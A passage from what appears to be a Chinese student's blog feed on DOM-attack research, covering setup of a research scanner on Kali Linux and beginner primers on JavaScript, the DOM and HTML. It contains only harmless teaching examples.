src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E5%9B%9B/4.png" style="zoom:100%;" /></center><p>&emsp;&emsp;最后，通过以下方式获取必要的依赖项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./install.sh<br></code></pre></td></tr></table></figure><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E5%9B%9B/5.png" style="zoom:100%;" /></center><p>&emsp;&emsp;遇到两个问题，一个是su root命令输入密码后出现鉴定故障错误，这是因为在安装linux系统时没有给root用户设置密码，重新设置密码即可，另一个是kali居然没有chromium-browser和npm，只能安装</p><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E5%9B%9B/6.png" style="zoom:100%;" /></center><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E5%9B%9B/7.png" style="zoom:100%;" /></center><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E5%9B%9B/8.png" style="zoom:100%;" /></center>&emsp;&emsp;可恶，chromium-browser安装没有安装源真的是困难重重，我只能另辟蹊径，实现下载网页的deb安装包，注意看类型， 我一开始下载的是arm，下错了，淦<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>launchpad.net<span class="hljs-regexp">/ubuntu/</span>+source/chromium-browser<br></code></pre></td></tr></table></figure><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E5%9B%9B/9.png" style="zoom:100%;" /></center><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E5%9B%9B/10.png" style="zoom:100%;" /></center><p>&emsp;&emsp;提示没有snapd，好的，继续干</p><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E5%9B%9B/11.png" style="zoom:100%;" /></center><p>&emsp;&emsp;搞定，继续./install.sh</p><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E5%9B%9B/12.png" style="zoom:100%;" /></center><p>&emsp;&emsp;ok，搞定了，这里需要提一下，我们需要下载一个Linux并行的压缩工具pigz,，后面的静态调试需要用到</p><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E5%9B%9B/14.png" style="zoom:100%;" /></center><p>&emsp;</p><h4 id="3-Pipline运行"><a href="#3-Pipline运行" class="headerlink" title="3.Pipline运行"></a>3.Pipline运行</h4><p>&emsp;&emsp;这里运行产生启动文件，为后续的三个模块做准备</p><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E5%9B%9B/13.png" style="zoom:100%;" /></center><p>&emsp;</p><h4 id="4-爬虫板块运行"><a href="#4-爬虫板块运行" class="headerlink" title="4.爬虫板块运行"></a>4.爬虫板块运行</h4><p>&emsp;&emsp;这里有个小细节，我们需要进入到crawler文件中才能执行对应的命令，作者在github里面没有说明，需要注意一下</p><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E5%9B%9B/15.png" style="zoom:100%;" /></center><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E5%9B%9B/16.png" style="zoom:100%;" /></center><p>&emsp;&emsp;会自动抓取相关url信息并生成信息文件</p><p>&emsp;</p><h4 id="5-静态分析器板块运行"><a href="#5-静态分析器板块运行" class="headerlink" title="5.静态分析器板块运行"></a>5.静态分析器板块运行</h4><p>&emsp;&emsp;接下来是运行静态分析工具，一开始报了错，提示有个变量x未给值，我一脸懵逼，但是看了代码才发现为什么开头多了个x，我没打开过文件，作者应该也不可能犯这种错误，百思不得其解，不过删去开头x这个变量后就能够运行了，接下就是等待跑的结果</p><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E5%9B%9B/17.png" style="zoom:100%;" /></center><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E5%9B%9B/18.png" style="zoom:100%;" /></center><p>&emsp;&emsp;跑了一个多小时，内存占用98%。直接绷不住了（T^T）</p><p>&emsp;</p><h4 id="6-动态分析器运行"><a href="#6-动态分析器运行" class="headerlink" title="6.动态分析器运行"></a>6.动态分析器运行</h4><p>&emsp;&emsp;跑出问题了，研究了一下动态分析的运行代码，从几个报错点出发</p><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E5%9B%9B/19.png" style="zoom:100%;" /></center><p>&emsp;&emsp;好像是存在语法上的错误，但是毕竟是一个大的扫描器，所以怕一动得全改，不太是我这个刚研究就能解决的，就去问了作者（大佬！）</p><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E5%9B%9B/20.png" style="zoom:100%;" /></center><p>&emsp;&emsp;大佬回得很快！和我猜想的应该没有太大出入，作者改动了部分代码，看来得重新更新环境和配置了，但是申请的服务器还没开，我还得等服务器开了搭配环境尝试运行效果才能回作者，感觉太过意不去了，毕竟作者是当天回的，我现在跑不了代码也不知道咋回，只能等了T^T</p>]]></content>
    
    
    <categories>
      
      <category>DOM-sabotage-attacks</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>前期准备——JavaScript了解</title>
    <link href="/2023/03/03/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%B8%89/"/>
    <url>/2023/03/03/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%B8%89/</url>
    
    <content type="html"><![CDATA[<h1 id="前期准备——JavaScript了解"><a href="#前期准备——JavaScript了解" class="headerlink" title="前期准备——JavaScript了解"></a>前期准备——JavaScript了解</h1><h4 id="1-什么是JavaScript"><a href="#1-什么是JavaScript" class="headerlink" title="1.什么是JavaScript"></a>1.什么是JavaScript</h4><p>&emsp;&emsp;JavaScript是一种比较轻量级的编程语言，用于Web应用程序的开发。它是一种客户端脚本语言，运行在Web浏览器中，可以通过HTML和CSS实现网页的交互和动态效果。除了浏览器，JavaScript也可以在服务器端运行，并且被称为Node.js，用于构建服务器应用程序和后端API。（说实话，感觉语法变量等一些方面和c语言差不多）</p><p>&emsp;</p><h4 id="2-JavaScript用法"><a href="#2-JavaScript用法" class="headerlink" title="2.JavaScript用法"></a>2.JavaScript用法</h4><p>&emsp;&emsp;JavaScript的使用需要规范，在HTML中的JavaScript脚本代码必须位于 《script》与《/script》标签之间。（这里的书名号是故意打错，是因为如果直接打&lt;&gt;直接会被识别为网页语句无法显示，所以用书名号代替）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;script&gt;<br>     <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;撩月的blog&quot;</span>);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>&emsp;&emsp;需要注意的是，JavaScript脚本代码可被放置在HTML页面的《body》和《head》中，通常，我们需要在某个事件发生时执行代码，比如当用户点击按钮时。如果我们把 JavaScript 代码放入函数中，就可以在事件发生时调用该函数：</p><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%B8%89/1.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="3-Chrome浏览器中的JavaScript调试"><a href="#3-Chrome浏览器中的JavaScript调试" class="headerlink" title="3.Chrome浏览器中的JavaScript调试"></a>3.Chrome浏览器中的JavaScript调试</h4><p>&emsp;&emsp;一般来说，现在大部分的浏览器都是拥有前端代码的调试功能，这对前端开发来说是非常方便的，以Chrome作为例子，加入浏览器后按下F12按键查看开发者工具</p><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%B8%89/2.png" style="zoom:80%;" /></center><p>&emsp;&emsp;或者在浏览器中使用snippets新建一个脚本</p><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%B8%89/3.png" style="zoom:80%;" /></center><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%B8%89/4.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="4-JavaScript的输出"><a href="#4-JavaScript的输出" class="headerlink" title="4.JavaScript的输出"></a>4.JavaScript的输出</h4><p>&emsp;&emsp;在JavaScript中没有任何打印的函数，但是能够通过不同的方式来输出数据，比如：弹出警告框window.alert()、写入HTML文档内容document.write()、写入HTML元素innerHTML、写入浏览器的控制台console.log()等等</p><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%B8%89/5.png" style="zoom:80%;" /></center><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%B8%89/6.png" style="zoom:80%;" /></center><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%B8%89/7.png" style="zoom:80%;" /></center><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%B8%89/8.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="5-JavaScript语法"><a href="#5-JavaScript语法" class="headerlink" title="5.JavaScript语法"></a>5.JavaScript语法</h4><p>&emsp;&emsp;JavaScript作为一个程序语言，语法规则定义了语言结构：</p><ul><li><h5 id="字面量"><a href="#字面量" class="headerlink" title="字面量"></a>字面量</h5><p>&emsp;&emsp;在编程语言中，一般固定值称为字面量，数字字面量可以是整数。小数胡总科学计数（e）；字符串字面量则需要使用单引号或者双引号囊括；表达式字面量用于计算；数组字面量定义数组；对象字面量定义对象，函数字面量定义函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//数字字面量</span><br><span class="hljs-number">3.14</span><br><span class="hljs-number">1001</span><br><span class="hljs-number">123e5</span><br><span class="hljs-comment">//字符串字面量</span><br><span class="hljs-string">&quot;John Doe&quot;</span><br><span class="hljs-string">&#x27;John Doe&#x27;</span><br><span class="hljs-comment">//表达式字面量</span><br><span class="hljs-number">5</span> + <span class="hljs-number">6</span><br><span class="hljs-number">5</span> * <span class="hljs-number">10</span><br><span class="hljs-comment">//数组字面量</span><br>[<span class="hljs-number">40</span>, <span class="hljs-number">100</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">25</span>, <span class="hljs-number">10</span>]<br><span class="hljs-comment">//对象字面量</span><br>&#123;<span class="hljs-attr">firstName</span>:<span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-attr">lastName</span>:<span class="hljs-string">&quot;Doe&quot;</span>, <span class="hljs-attr">age</span>:<span class="hljs-number">50</span>, <span class="hljs-attr">eyeColor</span>:<span class="hljs-string">&quot;blue&quot;</span>&#125;<br><span class="hljs-comment">//函数字面量</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">myFunction</span>(<span class="hljs-params">a, b</span>) &#123; <span class="hljs-keyword">return</span> a * b;&#125;<br></code></pre></td></tr></table></figure><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%B8%89/9.png" style="zoom:80%;" /></center></li><li><h5 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h5><p>&emsp;&emsp;JavaScript一般使用关键字var来定义变量，使用等号来赋值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> x, length<br>x = <span class="hljs-number">5</span><br>length = <span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%B8%89/10.png" style="zoom:80%;" /></center></li><li><h5 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h5><p>&emsp;&emsp;在 HTML 中，JavaScript 语句用于向浏览器发出命令。语句是用分号分隔</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">x = <span class="hljs-number">5</span> + <span class="hljs-number">6</span>;<br>y = x * <span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure></li><li><h5 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h5><p>&emsp;&emsp;不是所有的 JavaScript 语句都是”命令”。双斜杠 <strong>//</strong> 后的内容将会被浏览器忽略</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//我不执行，和c一样一样捏</span><br></code></pre></td></tr></table></figure></li><li><h5 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h5><p>&emsp;&emsp;有多种数据类型：数字，字符串，数组，对象等等</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// Number 通过数字字面量赋值</span><br><span class="hljs-keyword">var</span> length = <span class="hljs-number">16</span>;                                  <br><span class="hljs-comment">// Number 通过表达式字面量赋值</span><br><span class="hljs-keyword">var</span> points = x * <span class="hljs-number">10</span>;                              <br><span class="hljs-comment">// String 通过字符串字面量赋值</span><br><span class="hljs-keyword">var</span> lastName = <span class="hljs-string">&quot;Johnson&quot;</span>;                         <br><span class="hljs-comment">// Array  通过数组字面量赋值</span><br><span class="hljs-keyword">var</span> cars = [<span class="hljs-string">&quot;Saab&quot;</span>, <span class="hljs-string">&quot;Volvo&quot;</span>, <span class="hljs-string">&quot;BMW&quot;</span>];           <br><span class="hljs-comment">// Object 通过对象字面量赋值</span><br><span class="hljs-keyword">var</span> person = &#123;<span class="hljs-attr">firstName</span>:<span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-attr">lastName</span>:<span class="hljs-string">&quot;Doe&quot;</span>&#125;; <br></code></pre></td></tr></table></figure></li><li><h5 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h5><p>&emsp;&emsp;JavaScript 语句可以写在函数内，函数可以重复引用：引用一个函数*= 调用函数(执行函数内的语句)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">myFunction</span>(<span class="hljs-params">a, b</span>) &#123;<br>    <span class="hljs-comment">// 返回 a 乘以 b 的结果</span><br>    <span class="hljs-keyword">return</span> a * b;                                <br>&#125;<br></code></pre></td></tr></table></figure></li><li><h5 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h5><p>&emsp;&emsp;avaScript 对大小写是敏感的。当编写 JavaScript 语句时，需要注意大小写切换键。比如函数 <strong>getElementById</strong> 与 <strong>getElementbyID</strong> 是不同的。变量 <strong>myVariable</strong> 与 <strong>MyVariable</strong> 是不同的等等</p></li></ul><p>&emsp;</p><h4 id="6-JavaScript对象"><a href="#6-JavaScript对象" class="headerlink" title="6.JavaScript对象"></a>6.JavaScript对象</h4><p>&emsp;&emsp;在JavaScript中，几乎所有的事物都是对象，并且对象层面问题非常重要</p><ul><li><h5 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h5><p>&emsp;&emsp;对于对象的赋值，对象也是一个变量，可以包含多个值（多个变量），每一个都以name：value对呈现</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> car = &#123;<span class="hljs-attr">name</span>:<span class="hljs-string">&quot;Fiat&quot;</span>, <span class="hljs-attr">model</span>:<span class="hljs-number">500</span>, <span class="hljs-attr">color</span>:<span class="hljs-string">&quot;white&quot;</span>&#125;;<br></code></pre></td></tr></table></figure></li><li><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><p>&emsp;&emsp;我们可以使用字符来定义和创建JavaScript的对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">var</span> person = &#123;<span class="hljs-attr">firstName</span>:<span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-attr">lastName</span>:<span class="hljs-string">&quot;Doe&quot;</span>, <span class="hljs-attr">age</span>:<span class="hljs-number">50</span>, <span class="hljs-attr">eyeColor</span>:<span class="hljs-string">&quot;blue&quot;</span>&#125;;<br></code></pre></td></tr></table></figure><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%B8%89/11.png" style="zoom:80%;" /></center></li><li><h5 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h5><p>&emsp;&emsp;通常认为JavaScript对象是键值对的容器，键值对写法为name:value，键值对在JavaScript对象通常称为对象属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">//两种方式访问对象属性方法</span><br>person.<span class="hljs-property">lastName</span>;<br>person[<span class="hljs-string">&quot;lastName&quot;</span>];<br></code></pre></td></tr></table></figure></li><li><h5 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h5><p>&emsp;&emsp;对象的方法定义了一个函数，并作为对象的属性存储；</p><p>对象方法通过添加 () 调用 (作为一个函数。</p><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%B8%89/12.png" style="zoom:80%;" /></center></li></ul><p>&emsp;</p><h4 id="7-结尾"><a href="#7-结尾" class="headerlink" title="7.结尾"></a>7.结尾</h4><p>&emsp;&emsp;说实话，越往后面看，越觉得JavaScript不过是c语言的变种罢了，语言风格，函数，条件判断基本都大差不差，没啥区别，可能这就是学了c 的好处吧。后续的字符串、运算符、条件语句、循环语句等等都基本是类似的构造，所以就不再浪费时间了，直接开始环境的配置吧，等后续解析代码的时候遇到比较不同的再回来回顾补充</p>]]></content>
    
    
    <categories>
      
      <category>DOM-sabotage-attacks</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>前期准备——DOM了解</title>
    <link href="/2023/02/03/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%B8%80/"/>
    <url>/2023/02/03/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="前期准备——DOM了解"><a href="#前期准备——DOM了解" class="headerlink" title="前期准备——DOM了解"></a>前期准备——DOM了解</h1><h4 id="1-什么是DOM？"><a href="#1-什么是DOM？" class="headerlink" title="1.什么是DOM？"></a>1.什么是DOM？</h4><p>&emsp;&emsp;DOM（文档对象模型）是web浏览器对页面上元素的层次表示。网站可以使用JavaScript来操纵DOM的节点和对象及其属性。是中立于平台和语言的接口，它允许程序和脚本动态地访问和更新文档的内容、结构和样式</p><p>&emsp;&emsp;用比较通俗的解释，DOM是一个接口，是HTML和XML的编程接口，他将一个文档表示为了一棵树，再加上js脚本语言形成web中的对应网页界面</p><p>&emsp;</p><h4 id="2-HTML和XML的区别"><a href="#2-HTML和XML的区别" class="headerlink" title="2.HTML和XML的区别"></a>2.HTML和XML的区别</h4><p>&emsp;&emsp;HTML又称超文本标记语言，是通往web世界的钥匙。它使用了表姐标签的办法来对网页进行描述，它的文档中包含了HTML规定合法的标签以及相关的文本内容，所以一般打开HTML文档就是web页面</p><p>&emsp;&emsp;XML又称可扩展标记语言，用于创建网页和web应用程序。它是动态的，用于传输数据而不是用于显示数据 </p><p>&emsp;&emsp;总的来说，HTML 被设计用来显示数据，其焦点是数据的外观；而XML 被设计用来传输和存储数据，其焦点是数据的内容。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>我的第一个标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我的第一个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--  Edited by XMLSpy®  --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Tove<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Jani<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;当然我主要研究的是HTML中的DOM结构作为例子</p><p>&emsp;</p><h4 id="3-DOM树形结构"><a href="#3-DOM树形结构" class="headerlink" title="3.DOM树形结构"></a>3.DOM树形结构</h4><CENTER><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%B8%80/1.png" style="zoom:80%;" /></center>&emsp;<h4 id="4-DOM方法和属性"><a href="#4-DOM方法和属性" class="headerlink" title="4.DOM方法和属性"></a>4.DOM方法和属性</h4><p>&emsp;&emsp;我们可以通过 JavaScript （以及其他编程语言）对 HTML DOM 进行访问，所有 HTML 元素被定义为对象，而编程接口则是对象方法和对象属性。在DOM中方法是指我们可以在结点（HTML元素）上执行的动作，二属性则是指我们可以在结点（HTML元素）设置和修改的值</p><ul><li><h5 id="方法"><a href="#方法" class="headerlink" title="方法"></a><strong>方法</strong></h5></li></ul><p>&emsp;&emsp;以getElementById()为例，他是作为方法返回带有指定ID的元素</p><CENTER><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%B8%80/2.png" style="zoom:80%;" /></center><p>&emsp;&emsp;一些常用的 HTML DOM 方法：</p><CENTER><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%B8%80/3.png" style="zoom:80%;" /></center><ul><li><h5 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h5></li></ul><p>&emsp;&emsp;以innerHTML为例子，他是结点元素的文本值，其中 innerHTML 属性可用于获取或改变任意 HTML 元素，包括<hrml> 和 <body>。</p><CENTER><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%B8%80/4.png" style="zoom:80%;" /></center><p>&emsp;&emsp;一些常用的 HTML DOM 属性：</p><p>&emsp;&emsp;&emsp;&emsp;innerHTML - 节点（元素）的文本值</p><p>&emsp;&emsp;&emsp;&emsp;parentNode - 节点（元素）的父节点</p><p>&emsp;&emsp;&emsp;&emsp;childNodes - 节点（元素）的子节点</p><p>&emsp;&emsp;&emsp;&emsp;attributes - 节点（元素）的属性节点</p><p>&emsp;</p><h4 id="5-DOM修改"><a href="#5-DOM修改" class="headerlink" title="5.DOM修改"></a>5.DOM修改</h4><p>&emsp;&emsp;对于HTML DOM的的修改可以意味着许多的不同的方面，比如HTML内容、CSS样式、HTML属性、创建或删除HTML元素、改变事件顺序（处理程序顺序）。</p><p>&emsp;&emsp;以修改文本样式为例子:</p><CENTER><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%B8%80/5.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="6-DOM事件"><a href="#6-DOM事件" class="headerlink" title="6.DOM事件"></a>6.DOM事件</h4><p>&emsp;&emsp;HTML DOM 允许 JavaScript 对 HTML 事件作出反应。当事件发生时，可以执行 JavaScript，比如当用户点击一个 HTML 元素时。如需在用户点击某个元素时执行代码，请把 JavaScript 代码添加到 HTML 事件属性中：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">onclick=<span class="hljs-title class_">JavaScript</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;当用户点击鼠标时、当网页已加载时、当图片已加载时、当鼠标移动到元素上时、当输入字段被改变时、当 HTML 表单被提交时、当用户触发按键时;</p><CENTER><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%B8%80/6.png" style="zoom:80%;" /></center><CENTER><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%B8%80/7.png" style="zoom:80%;" /></center><p>&emsp;&emsp;总的来说，就是当触发了某些操作条件后，会对页面内容进行修改，达到交互的结果。比如当用户进入或离开页面时，会触发 onload 和 onunload 事件。onload 事件可用于检查访客的浏览器类型和版本，以便基于这些信息来加载不同版本的网页。onload 和 onunload 事件可用于处理 cookies。</p>]]></content>
    
    
    <categories>
      
      <category>DOM-sabotage-attacks</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>前期准备——HTML温习</title>
    <link href="/2023/02/01/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%BA%8C/"/>
    <url>/2023/02/01/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="前期准备——HTML温习"><a href="#前期准备——HTML温习" class="headerlink" title="前期准备——HTML温习"></a>前期准备——HTML温习</h1><h4 id="1-什么是HTML？"><a href="#1-什么是HTML？" class="headerlink" title="1.什么是HTML？"></a>1.什么是HTML？</h4><p>&emsp;&emsp;HTML是用来描述网页的一种语言，也就是超文本标记语言。这种语言不是一种编程语言，而是标记语言，其实用标记标签来描述网页。HTML文档也叫做web页面</p><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%BA%8C/1.png" style="zoom:80%;" /></center><p>&emsp;&emsp;在浏览器的页面上使用键盘上的 F12 按键开启调试模式，就可以看到组成标签</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml">**<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>** 元素是 HTML 页面的根元素<br><br>**<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>** 元素包含了文档的元（meta）数据，如 **<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span>** 定义网页编码格式为 **utf-8**。<br><br>**<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>** 元素描述了文档的标题<br><br>**<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>** 元素包含了可见的页面内容<br><br>**<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>** 元素定义一个大标题<br><br>**<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>** 元素定义一个段落<br></code></pre></td></tr></table></figure><p>&emsp;&emsp;</p><h4 